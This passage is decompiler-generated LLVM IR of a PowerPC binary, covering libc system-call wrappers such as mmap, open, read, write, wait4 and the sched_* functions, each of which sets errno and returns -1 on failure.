  %v3_10008dc0 = load i32, i32* %v2_10008dc0, align 4
  %v3_10008dc4 = icmp eq i32 %v3_10008dc0, 0
  br i1 %v3_10008dc4, label %dec_label_pc_10008ddc, label %dec_label_pc_10008dcc

dec_label_pc_10008dcc:                            ; preds = %entry
  %v1_10008dd0 = add i32 %arg1, 452
  store i32 268471772, i32* @lr, align 4
  %v3_10008dd8 = call i32 @__GI_sigprocmask(i32 2, i32 %v1_10008dd0, i32 0)
  %v0_10008ddc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008ddc

dec_label_pc_10008ddc:                            ; preds = %entry, %dec_label_pc_10008dcc
  %v0_10008ddc = phi i32 [ %arg2, %entry ], [ %v0_10008ddc.pre, %dec_label_pc_10008dcc ]
  %v3_10008ddc = icmp eq i32 %v0_10008ddc, 0
  br i1 %v3_10008ddc, label %dec_label_pc_10008de4, label %dec_label_pc_10008de8

dec_label_pc_10008de4:                            ; preds = %dec_label_pc_10008ddc
  br label %dec_label_pc_10008de8

dec_label_pc_10008de8:                            ; preds = %dec_label_pc_10008ddc, %dec_label_pc_10008de4
  %v0_10008dec = phi i32 [ %v0_10008ddc, %dec_label_pc_10008ddc ], [ 1, %dec_label_pc_10008de4 ]
  %v0_10008de8 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008df0 = inttoptr i32 %v0_10008de8 to i32*
  %v3_10008df0 = call i32 @__longjmp(i32* %v2_10008df0, i32 %v0_10008dec)
  ret i32 %v3_10008df0

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008de8, { 1, 0 }
  uselistorder label %dec_label_pc_10008ddc, { 1, 0 }
}

define i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008e0c = call i32 @__asm_mfcr()
  %v1_10008e10 = and i32 %v0_10008e0c, 268435456
  %v3_10008e10 = icmp eq i32 %v1_10008e10, 0
  store i32 %v0_10008e0c, i32* %r31.global-to-local, align 4
  br i1 %v3_10008e10, label %dec_label_pc_10008e28, label %dec_label_pc_10008e1c

dec_label_pc_10008e1c:                            ; preds = %entry
  %v0_10008e1c = call i32 @__errno_location()
  %v0_10008e20 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008e20 = inttoptr i32 %v0_10008e1c to i32*
  store i32 %v0_10008e20, i32* %v2_10008e20, align 4
  br label %dec_label_pc_10008e28

dec_label_pc_10008e28:                            ; preds = %entry, %dec_label_pc_10008e1c
  %v0_10008e38 = phi i32 [ %v0_10008e0c, %entry ], [ -1, %dec_label_pc_10008e1c ]
  ret i32 %v0_10008e38

; uselistorder directives
  uselistorder label %dec_label_pc_10008e28, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008e54 = call i32 @__asm_mfcr()
  %v1_10008e58 = and i32 %v0_10008e54, 268435456
  %v3_10008e58 = icmp eq i32 %v1_10008e58, 0
  store i32 %v0_10008e54, i32* %r31.global-to-local, align 4
  br i1 %v3_10008e58, label %dec_label_pc_10008e70, label %dec_label_pc_10008e64

dec_label_pc_10008e64:                            ; preds = %entry
  %v0_10008e64 = call i32 @__errno_location()
  %v0_10008e68 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008e68 = inttoptr i32 %v0_10008e64 to i32*
  store i32 %v0_10008e68, i32* %v2_10008e68, align 4
  br label %dec_label_pc_10008e70

dec_label_pc_10008e70:                            ; preds = %entry, %dec_label_pc_10008e64
  %v0_10008e80 = phi i32 [ %v0_10008e54, %entry ], [ -1, %dec_label_pc_10008e64 ]
  ret i32 %v0_10008e80

; uselistorder directives
  uselistorder label %dec_label_pc_10008e70, { 1, 0 }
}

define i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008e9c = call i32 @__asm_mfcr()
  %v1_10008ea0 = and i32 %v0_10008e9c, 268435456
  %v3_10008ea0 = icmp eq i32 %v1_10008ea0, 0
  store i32 %v0_10008e9c, i32* %r31.global-to-local, align 4
  br i1 %v3_10008ea0, label %dec_label_pc_10008eb8, label %dec_label_pc_10008eac

dec_label_pc_10008eac:                            ; preds = %entry
  %v0_10008eac = call i32 @__errno_location()
  %v0_10008eb0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008eb0 = inttoptr i32 %v0_10008eac to i32*
  store i32 %v0_10008eb0, i32* %v2_10008eb0, align 4
  br label %dec_label_pc_10008eb8

dec_label_pc_10008eb8:                            ; preds = %entry, %dec_label_pc_10008eac
  %v0_10008ec8 = phi i32 [ %v0_10008e9c, %entry ], [ -1, %dec_label_pc_10008eac ]
  ret i32 %v0_10008ec8

; uselistorder directives
  uselistorder label %dec_label_pc_10008eb8, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008ee4 = call i32 @__asm_mfcr()
  %v1_10008ee8 = and i32 %v0_10008ee4, 268435456
  %v3_10008ee8 = icmp eq i32 %v1_10008ee8, 0
  store i32 %v0_10008ee4, i32* %r31.global-to-local, align 4
  br i1 %v3_10008ee8, label %dec_label_pc_10008f00, label %dec_label_pc_10008ef4

dec_label_pc_10008ef4:                            ; preds = %entry
  %v0_10008ef4 = call i32 @__errno_location()
  %v0_10008ef8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008ef8 = inttoptr i32 %v0_10008ef4 to i32*
  store i32 %v0_10008ef8, i32* %v2_10008ef8, align 4
  br label %dec_label_pc_10008f00

dec_label_pc_10008f00:                            ; preds = %entry, %dec_label_pc_10008ef4
  %v0_10008f10 = phi i32 [ %v0_10008ee4, %entry ], [ -1, %dec_label_pc_10008ef4 ]
  ret i32 %v0_10008f10

; uselistorder directives
  uselistorder label %dec_label_pc_10008f00, { 1, 0 }
}

define i32 @__libc_nanosleep() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008f2c = call i32 @__asm_mfcr()
  %v1_10008f30 = and i32 %v0_10008f2c, 268435456
  %v3_10008f30 = icmp eq i32 %v1_10008f30, 0
  store i32 %v0_10008f2c, i32* %r31.global-to-local, align 4
  br i1 %v3_10008f30, label %dec_label_pc_10008f48, label %dec_label_pc_10008f3c

dec_label_pc_10008f3c:                            ; preds = %entry
  %v0_10008f3c = call i32 @__errno_location()
  %v0_10008f40 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008f40 = inttoptr i32 %v0_10008f3c to i32*
  store i32 %v0_10008f40, i32* %v2_10008f40, align 4
  br label %dec_label_pc_10008f48

dec_label_pc_10008f48:                            ; preds = %entry, %dec_label_pc_10008f3c
  %v0_10008f58 = phi i32 [ %v0_10008f2c, %entry ], [ -1, %dec_label_pc_10008f3c ]
  ret i32 %v0_10008f58

; uselistorder directives
  uselistorder label %dec_label_pc_10008f48, { 1, 0 }
}

define i32 @__libc_open() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_10008f70 = load i32, i32* @r4, align 4
  %v1_10008f70 = and i32 %v0_10008f70, 64
  %v3_10008f70 = icmp eq i32 %v1_10008f70, 0
  br i1 %v3_10008f70, label %dec_label_pc_10008f9c, label %dec_label_pc_10008f80

dec_label_pc_10008f80:                            ; preds = %entry
  %v2_10008f88 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10008f88, i32* %stack_var_-32, align 4
  %v0_10008f98 = load i32, i32* @r5, align 4
  br label %dec_label_pc_10008f9c

dec_label_pc_10008f9c:                            ; preds = %entry, %dec_label_pc_10008f80
  %v0_10008f9c = phi i32 [ 0, %entry ], [ %v0_10008f98, %dec_label_pc_10008f80 ]
  store i32 %v0_10008f9c, i32* @r5, align 4
  %v0_10008fa4 = call i32 @__asm_mfcr()
  %v1_10008fa8 = and i32 %v0_10008fa4, 268435456
  %v3_10008fa8 = icmp eq i32 %v1_10008fa8, 0
  store i32 %v0_10008fa4, i32* %r31.global-to-local, align 4
  br i1 %v3_10008fa8, label %dec_label_pc_10008fc0, label %dec_label_pc_10008fb4

dec_label_pc_10008fb4:                            ; preds = %dec_label_pc_10008f9c
  %v0_10008fb4 = call i32 @__errno_location()
  %v0_10008fb8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008fb8 = inttoptr i32 %v0_10008fb4 to i32*
  store i32 %v0_10008fb8, i32* %v2_10008fb8, align 4
  br label %dec_label_pc_10008fc0

dec_label_pc_10008fc0:                            ; preds = %dec_label_pc_10008f9c, %dec_label_pc_10008fb4
  %v0_10008fd0 = phi i32 [ %v0_10008fa4, %dec_label_pc_10008f9c ], [ -1, %dec_label_pc_10008fb4 ]
  ret i32 %v0_10008fd0

; uselistorder directives
  uselistorder label %dec_label_pc_10008fc0, { 1, 0 }
  uselistorder label %dec_label_pc_10008f9c, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  store i32 577, i32* @r4, align 4
  %v0_10008fe0 = call i32 @__libc_open()
  ret i32 %v0_10008fe0
}

define i32 @__GI___libc_open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v1_10008ff4 = and i32 %arg1, 64
  %v3_10008ff4 = icmp eq i32 %v1_10008ff4, 0
  %v1_10008ff8 = or i32 %arg1, 65536
  store i32 %v1_10008ff8, i32* @r4, align 4
  br i1 %v3_10008ff4, label %dec_label_pc_10009020, label %dec_label_pc_10009004

dec_label_pc_10009004:                            ; preds = %entry
  %v2_1000900c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_1000900c, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10009020

dec_label_pc_10009020:                            ; preds = %entry, %dec_label_pc_10009004
  %v0_10009020 = phi i32 [ 0, %entry ], [ %arg2, %dec_label_pc_10009004 ]
  store i32 %v0_10009020, i32* @r5, align 4
  store i32 268472364, i32* @lr, align 4
  %v0_10009028 = call i32 @__libc_open()
  ret i32 %v0_10009028

; uselistorder directives
  uselistorder label %dec_label_pc_10009020, { 1, 0 }
}

define i32 @__libc_pause(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009054 = call i32 @__asm_mfcr()
  %v1_10009058 = and i32 %v0_10009054, 268435456
  %v3_10009058 = icmp eq i32 %v1_10009058, 0
  store i32 %v0_10009054, i32* %r31.global-to-local, align 4
  br i1 %v3_10009058, label %dec_label_pc_10009070, label %dec_label_pc_10009064

dec_label_pc_10009064:                            ; preds = %entry
  %v0_10009064 = call i32 @__errno_location()
  %v0_10009068 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009068 = inttoptr i32 %v0_10009064 to i32*
  store i32 %v0_10009068, i32* %v2_10009068, align 4
  br label %dec_label_pc_10009070

dec_label_pc_10009070:                            ; preds = %entry, %dec_label_pc_10009064
  %v0_10009080 = phi i32 [ %v0_10009054, %entry ], [ -1, %dec_label_pc_10009064 ]
  ret i32 %v0_10009080

; uselistorder directives
  uselistorder label %dec_label_pc_10009070, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000909c = call i32 @__asm_mfcr()
  %v1_100090a0 = and i32 %v0_1000909c, 268435456
  %v3_100090a0 = icmp eq i32 %v1_100090a0, 0
  store i32 %v0_1000909c, i32* %r31.global-to-local, align 4
  br i1 %v3_100090a0, label %dec_label_pc_100090b8, label %dec_label_pc_100090ac

dec_label_pc_100090ac:                            ; preds = %entry
  %v0_100090ac = call i32 @__errno_location()
  %v0_100090b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100090b0 = inttoptr i32 %v0_100090ac to i32*
  store i32 %v0_100090b0, i32* %v2_100090b0, align 4
  br label %dec_label_pc_100090b8

dec_label_pc_100090b8:                            ; preds = %entry, %dec_label_pc_100090ac
  %v0_100090c8 = phi i32 [ %v0_1000909c, %entry ], [ -1, %dec_label_pc_100090ac ]
  ret i32 %v0_100090c8

; uselistorder directives
  uselistorder label %dec_label_pc_100090b8, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100090e4 = call i32 @__asm_mfcr()
  %v1_100090e8 = and i32 %v0_100090e4, 268435456
  %v3_100090e8 = icmp eq i32 %v1_100090e8, 0
  store i32 %v0_100090e4, i32* %r31.global-to-local, align 4
  br i1 %v3_100090e8, label %dec_label_pc_10009100, label %dec_label_pc_100090f4

dec_label_pc_100090f4:                            ; preds = %entry
  %v0_100090f4 = call i32 @__errno_location()
  %v0_100090f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100090f8 = inttoptr i32 %v0_100090f4 to i32*
  store i32 %v0_100090f8, i32* %v2_100090f8, align 4
  br label %dec_label_pc_10009100

dec_label_pc_10009100:                            ; preds = %entry, %dec_label_pc_100090f4
  %v0_10009110 = phi i32 [ %v0_100090e4, %entry ], [ -1, %dec_label_pc_100090f4 ]
  ret i32 %v0_10009110

; uselistorder directives
  uselistorder label %dec_label_pc_10009100, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000912c = call i32 @__asm_mfcr()
  %v1_10009130 = and i32 %v0_1000912c, 268435456
  %v3_10009130 = icmp eq i32 %v1_10009130, 0
  store i32 %v0_1000912c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009130, label %dec_label_pc_10009148, label %dec_label_pc_1000913c

dec_label_pc_1000913c:                            ; preds = %entry
  %v0_1000913c = call i32 @__errno_location()
  %v0_10009140 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009140 = inttoptr i32 %v0_1000913c to i32*
  store i32 %v0_10009140, i32* %v2_10009140, align 4
  br label %dec_label_pc_10009148

dec_label_pc_10009148:                            ; preds = %entry, %dec_label_pc_1000913c
  %v0_10009158 = phi i32 [ %v0_1000912c, %entry ], [ -1, %dec_label_pc_1000913c ]
  ret i32 %v0_10009158

; uselistorder directives
  uselistorder label %dec_label_pc_10009148, { 1, 0 }
}

define i32 @sched_get_priority_max(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009174 = call i32 @__asm_mfcr()
  %v1_10009178 = and i32 %v0_10009174, 268435456
  %v3_10009178 = icmp eq i32 %v1_10009178, 0
  store i32 %v0_10009174, i32* %r31.global-to-local, align 4
  br i1 %v3_10009178, label %dec_label_pc_10009190, label %dec_label_pc_10009184

dec_label_pc_10009184:                            ; preds = %entry
  %v0_10009184 = call i32 @__errno_location()
  %v0_10009188 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009188 = inttoptr i32 %v0_10009184 to i32*
  store i32 %v0_10009188, i32* %v2_10009188, align 4
  br label %dec_label_pc_10009190

dec_label_pc_10009190:                            ; preds = %entry, %dec_label_pc_10009184
  %v0_100091a0 = phi i32 [ %v0_10009174, %entry ], [ -1, %dec_label_pc_10009184 ]
  ret i32 %v0_100091a0

; uselistorder directives
  uselistorder label %dec_label_pc_10009190, { 1, 0 }
}

define i32 @sched_get_priority_min(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100091bc = call i32 @__asm_mfcr()
  %v1_100091c0 = and i32 %v0_100091bc, 268435456
  %v3_100091c0 = icmp eq i32 %v1_100091c0, 0
  store i32 %v0_100091bc, i32* %r31.global-to-local, align 4
  br i1 %v3_100091c0, label %dec_label_pc_100091d8, label %dec_label_pc_100091cc

dec_label_pc_100091cc:                            ; preds = %entry
  %v0_100091cc = call i32 @__errno_location()
  %v0_100091d0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100091d0 = inttoptr i32 %v0_100091cc to i32*
  store i32 %v0_100091d0, i32* %v2_100091d0, align 4
  br label %dec_label_pc_100091d8

dec_label_pc_100091d8:                            ; preds = %entry, %dec_label_pc_100091cc
  %v0_100091e8 = phi i32 [ %v0_100091bc, %entry ], [ -1, %dec_label_pc_100091cc ]
  ret i32 %v0_100091e8

; uselistorder directives
  uselistorder label %dec_label_pc_100091d8, { 1, 0 }
}

define i32 @sched_getparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009204 = call i32 @__asm_mfcr()
  %v1_10009208 = and i32 %v0_10009204, 268435456
  %v3_10009208 = icmp eq i32 %v1_10009208, 0
  store i32 %v0_10009204, i32* %r31.global-to-local, align 4
  br i1 %v3_10009208, label %dec_label_pc_10009220, label %dec_label_pc_10009214

dec_label_pc_10009214:                            ; preds = %entry
  %v0_10009214 = call i32 @__errno_location()
  %v0_10009218 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009218 = inttoptr i32 %v0_10009214 to i32*
  store i32 %v0_10009218, i32* %v2_10009218, align 4
  br label %dec_label_pc_10009220

dec_label_pc_10009220:                            ; preds = %entry, %dec_label_pc_10009214
  %v0_10009230 = phi i32 [ %v0_10009204, %entry ], [ -1, %dec_label_pc_10009214 ]
  ret i32 %v0_10009230

; uselistorder directives
  uselistorder label %dec_label_pc_10009220, { 1, 0 }
}

define i32 @sched_getscheduler(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000924c = call i32 @__asm_mfcr()
  %v1_10009250 = and i32 %v0_1000924c, 268435456
  %v3_10009250 = icmp eq i32 %v1_10009250, 0
  store i32 %v0_1000924c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009250, label %dec_label_pc_10009268, label %dec_label_pc_1000925c

dec_label_pc_1000925c:                            ; preds = %entry
  %v0_1000925c = call i32 @__errno_location()
  %v0_10009260 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009260 = inttoptr i32 %v0_1000925c to i32*
  store i32 %v0_10009260, i32* %v2_10009260, align 4
  br label %dec_label_pc_10009268

dec_label_pc_10009268:                            ; preds = %entry, %dec_label_pc_1000925c
  %v0_10009278 = phi i32 [ %v0_1000924c, %entry ], [ -1, %dec_label_pc_1000925c ]
  ret i32 %v0_10009278

; uselistorder directives
  uselistorder label %dec_label_pc_10009268, { 1, 0 }
}

define i32 @sched_setscheduler() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009294 = call i32 @__asm_mfcr()
  %v1_10009298 = and i32 %v0_10009294, 268435456
  %v3_10009298 = icmp eq i32 %v1_10009298, 0
  store i32 %v0_10009294, i32* %r31.global-to-local, align 4
  br i1 %v3_10009298, label %dec_label_pc_100092b0, label %dec_label_pc_100092a4

dec_label_pc_100092a4:                            ; preds = %entry
  %v0_100092a4 = call i32 @__errno_location()
  %v0_100092a8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100092a8 = inttoptr i32 %v0_100092a4 to i32*
  store i32 %v0_100092a8, i32* %v2_100092a8, align 4
  br label %dec_label_pc_100092b0

dec_label_pc_100092b0:                            ; preds = %entry, %dec_label_pc_100092a4
  %v0_100092c0 = phi i32 [ %v0_10009294, %entry ], [ -1, %dec_label_pc_100092a4 ]
  ret i32 %v0_100092c0

; uselistorder directives
  uselistorder label %dec_label_pc_100092b0, { 1, 0 }
}

define i32 @sched_yield(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100092dc = call i32 @__asm_mfcr()
  %v1_100092e0 = and i32 %v0_100092dc, 268435456
  %v3_100092e0 = icmp eq i32 %v1_100092e0, 0
  store i32 %v0_100092dc, i32* %r31.global-to-local, align 4
  br i1 %v3_100092e0, label %dec_label_pc_100092f8, label %dec_label_pc_100092ec

dec_label_pc_100092ec:                            ; preds = %entry
  %v0_100092ec = call i32 @__errno_location()
  %v0_100092f0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100092f0 = inttoptr i32 %v0_100092ec to i32*
  store i32 %v0_100092f0, i32* %v2_100092f0, align 4
  br label %dec_label_pc_100092f8

dec_label_pc_100092f8:                            ; preds = %entry, %dec_label_pc_100092ec
  %v0_10009308 = phi i32 [ %v0_100092dc, %entry ], [ -1, %dec_label_pc_100092ec ]
  ret i32 %v0_10009308

; uselistorder directives
  uselistorder label %dec_label_pc_100092f8, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009324 = call i32 @__asm_mfcr()
  %v1_10009328 = and i32 %v0_10009324, 268435456
  %v3_10009328 = icmp eq i32 %v1_10009328, 0
  store i32 %v0_10009324, i32* %r31.global-to-local, align 4
  br i1 %v3_10009328, label %dec_label_pc_10009340, label %dec_label_pc_10009334

dec_label_pc_10009334:                            ; preds = %entry
  %v0_10009334 = call i32 @__errno_location()
  %v0_10009338 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009338 = inttoptr i32 %v0_10009334 to i32*
  store i32 %v0_10009338, i32* %v2_10009338, align 4
  br label %dec_label_pc_10009340

dec_label_pc_10009340:                            ; preds = %entry, %dec_label_pc_10009334
  %v0_10009350 = phi i32 [ %v0_10009324, %entry ], [ -1, %dec_label_pc_10009334 ]
  ret i32 %v0_10009350

; uselistorder directives
  uselistorder label %dec_label_pc_10009340, { 1, 0 }
}

define i32 @__GI_setrlimit(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000936c = call i32 @__asm_mfcr()
  %v1_10009370 = and i32 %v0_1000936c, 268435456
  %v3_10009370 = icmp eq i32 %v1_10009370, 0
  store i32 %v0_1000936c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009370, label %dec_label_pc_10009388, label %dec_label_pc_1000937c

dec_label_pc_1000937c:                            ; preds = %entry
  %v0_1000937c = call i32 @__errno_location()
  %v0_10009380 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009380 = inttoptr i32 %v0_1000937c to i32*
  store i32 %v0_10009380, i32* %v2_10009380, align 4
  br label %dec_label_pc_10009388

dec_label_pc_10009388:                            ; preds = %entry, %dec_label_pc_1000937c
  %v0_10009398 = phi i32 [ %v0_1000936c, %entry ], [ -1, %dec_label_pc_1000937c ]
  ret i32 %v0_10009398

; uselistorder directives
  uselistorder label %dec_label_pc_10009388, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_1000939c = icmp eq i32 %arg2, 0
  br i1 %v3_1000939c, label %dec_label_pc_100093dc, label %dec_label_pc_100093c4

dec_label_pc_100093c4:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_100093dc, label %dec_label_pc_100093cc

dec_label_pc_100093cc:                            ; preds = %dec_label_pc_100093c4
  %v0_100093cc = call i32 @__errno_location()
  %v2_100093d4 = inttoptr i32 %v0_100093cc to i32*
  store i32 22, i32* %v2_100093d4, align 4
  %v0_10009400.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100093fc

dec_label_pc_100093dc:                            ; preds = %dec_label_pc_100093c4, %entry
  %v0_100093e0 = call i32 @__asm_mfcr()
  %v1_100093e4 = and i32 %v0_100093e0, 268435456
  %v3_100093e4 = icmp eq i32 %v1_100093e4, 0
  store i32 %v0_100093e0, i32* %r31.global-to-local, align 4
  br i1 %v3_100093e4, label %dec_label_pc_100093fc, label %dec_label_pc_100093f0

dec_label_pc_100093f0:                            ; preds = %dec_label_pc_100093dc
  %v0_100093f0 = call i32 @__errno_location()
  %v0_100093f4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100093f4 = inttoptr i32 %v0_100093f0 to i32*
  store i32 %v0_100093f4, i32* %v2_100093f4, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100093fc

dec_label_pc_100093fc:                            ; preds = %dec_label_pc_100093dc, %dec_label_pc_100093cc, %dec_label_pc_100093f0
  %v0_10009400 = phi i32 [ %v0_100093e0, %dec_label_pc_100093dc ], [ %v0_10009400.pre, %dec_label_pc_100093cc ], [ -1, %dec_label_pc_100093f0 ]
  ret i32 %v0_10009400

; uselistorder directives
  uselistorder label %dec_label_pc_100093fc, { 2, 0, 1 }
}

define i32 @__libc_sigsuspend(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009430 = call i32 @__asm_mfcr()
  %v1_10009434 = and i32 %v0_10009430, 268435456
  %v3_10009434 = icmp eq i32 %v1_10009434, 0
  store i32 %v0_10009430, i32* %r31.global-to-local, align 4
  br i1 %v3_10009434, label %dec_label_pc_1000944c, label %dec_label_pc_10009440

dec_label_pc_10009440:                            ; preds = %entry
  %v0_10009440 = call i32 @__errno_location()
  %v0_10009444 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009444 = inttoptr i32 %v0_10009440 to i32*
  store i32 %v0_10009444, i32* %v2_10009444, align 4
  br label %dec_label_pc_1000944c

dec_label_pc_1000944c:                            ; preds = %entry, %dec_label_pc_10009440
  %v0_1000945c = phi i32 [ %v0_10009430, %entry ], [ -1, %dec_label_pc_10009440 ]
  ret i32 %v0_1000945c

; uselistorder directives
  uselistorder label %dec_label_pc_1000944c, { 1, 0 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009478 = call i32 @__asm_mfcr()
  %v1_1000947c = and i32 %v0_10009478, 268435456
  %v3_1000947c = icmp eq i32 %v1_1000947c, 0
  store i32 %v0_10009478, i32* %r31.global-to-local, align 4
  br i1 %v3_1000947c, label %dec_label_pc_10009494, label %dec_label_pc_10009488

dec_label_pc_10009488:                            ; preds = %entry
  %v0_10009488 = call i32 @__errno_location()
  %v0_1000948c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000948c = inttoptr i32 %v0_10009488 to i32*
  store i32 %v0_1000948c, i32* %v2_1000948c, align 4
  br label %dec_label_pc_10009494

dec_label_pc_10009494:                            ; preds = %entry, %dec_label_pc_10009488
  %v0_100094a4 = phi i32 [ %v0_10009478, %entry ], [ -1, %dec_label_pc_10009488 ]
  ret i32 %v0_100094a4

; uselistorder directives
  uselistorder label %dec_label_pc_10009494, { 1, 0 }
}

define i32 @__libc_wait(i32 %arg1) local_unnamed_addr {
entry:
  %v4_100094b8 = call i32 @wait4(i32 -1, i32 %arg1, i32 0, i32 0)
  ret i32 %v4_100094b8
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100094d4 = call i32 @__asm_mfcr()
  %v1_100094d8 = and i32 %v0_100094d4, 268435456
  %v3_100094d8 = icmp eq i32 %v1_100094d8, 0
  store i32 %v0_100094d4, i32* %r31.global-to-local, align 4
  br i1 %v3_100094d8, label %dec_label_pc_100094f0, label %dec_label_pc_100094e4

dec_label_pc_100094e4:                            ; preds = %entry
  %v0_100094e4 = call i32 @__errno_location()
  %v0_100094e8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100094e8 = inttoptr i32 %v0_100094e4 to i32*
  store i32 %v0_100094e8, i32* %v2_100094e8, align 4
  br label %dec_label_pc_100094f0

dec_label_pc_100094f0:                            ; preds = %entry, %dec_label_pc_100094e4
  %v0_10009500 = phi i32 [ %v0_100094d4, %entry ], [ -1, %dec_label_pc_100094e4 ]
  ret i32 %v0_10009500

; uselistorder directives
  uselistorder label %dec_label_pc_100094f0, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10009508 = load i32, i32* @r4, align 4
  %v2_10009508 = load i32, i32* @r5, align 4
  %v4_10009508 = call i32 @wait4(i32 0, i32 %v1_10009508, i32 %v2_10009508, i32 0)
  ret i32 %v4_10009508
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009524 = call i32 @__asm_mfcr()
  %v1_10009528 = and i32 %v0_10009524, 268435456
  %v3_10009528 = icmp eq i32 %v1_10009528, 0
  store i32 %v0_10009524, i32* %r31.global-to-local, align 4
  br i1 %v3_10009528, label %dec_label_pc_10009540, label %dec_label_pc_10009534

dec_label_pc_10009534:                            ; preds = %entry
  %v0_10009534 = call i32 @__errno_location()
  %v0_10009538 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009538 = inttoptr i32 %v0_10009534 to i32*
  store i32 %v0_10009538, i32* %v2_10009538, align 4
  br label %dec_label_pc_10009540

dec_label_pc_10009540:                            ; preds = %entry, %dec_label_pc_10009534
  %v0_10009550 = phi i32 [ %v0_10009524, %entry ], [ -1, %dec_label_pc_10009534 ]
  ret i32 %v0_10009550

; uselistorder directives
  uselistorder label %dec_label_pc_10009540, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10009554 = add i32 %arg1, 128
  %v1_10009558 = mul i32 %arg1, 2
  %v2_1000955c = icmp ugt i32 %v1_10009554, 383
  %v0_10009560 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000955c, i32 %v0_10009560)
